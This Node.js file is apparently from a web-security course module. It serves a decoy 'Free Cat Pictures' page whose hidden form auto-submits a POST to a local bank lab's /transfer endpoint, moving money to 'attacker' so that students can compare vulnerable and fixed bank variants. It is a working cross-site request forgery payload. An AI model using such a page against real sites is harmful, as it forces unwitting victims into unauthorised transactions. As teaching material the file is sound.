/*
 * server.js (the "attacker site" -- auto-submitting form)
 *
 * Module 10: CSRF via POST.
 *
 * An <img> tag can only ever fire a GET -- it has no way to send a
 * request body. To forge a POST, this page instead embeds a hidden
 * <form method="post"> pointed at the bank, and a tiny inline <script>
 * that submits it automatically the instant the page loads. No click,
 * no visible UI -- identical in spirit to Module 09's hidden <img>,
 * just upgraded to work against a POST-only endpoint.
 *
 * This SAME page is used against BOTH bank variants in this module
 * (bank-vulnerable and bank-fixed) so you can directly compare the
 * outcome without changing the attack at all.
 *
 * Introduced in: Module 10.
 * Previous module's equivalent: node/attacker/server.js (Module 09).
 * Prerequisite concepts: Module 09 (CSRF via GET).
 */

'use strict';

const http = require('http');

const PORT = 8001;

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Free Cat Pictures</title></head>
<body style="font-family:sans-serif;max-width:640px;margin:40px auto;">
  <h1>100% Legitimate Free Cat Pictures</h1>
  <p>Still just cats. Nothing to see here.</p>
  <!-- Hidden form, auto-submitted by the script below -- forges a POST
       the same way Module 09's hidden <img> forged a GET -->
  <form id="csrf-form" method="post" action="http://localhost:8000/transfer" style="display:none">
    <input name="to" value="attacker">
    <input name="amount" value="250">
  </form>
  <script>
    // Fires the instant this page loads -- no click, no visible UI
    document.getElementById('csrf-form').submit();
  </script>
</body></html>`);
});

server.listen(PORT, () => {
  console.log(`Module 10 ATTACKER SITE (auto-submitting POST form) up on http://localhost:${PORT}`);
});
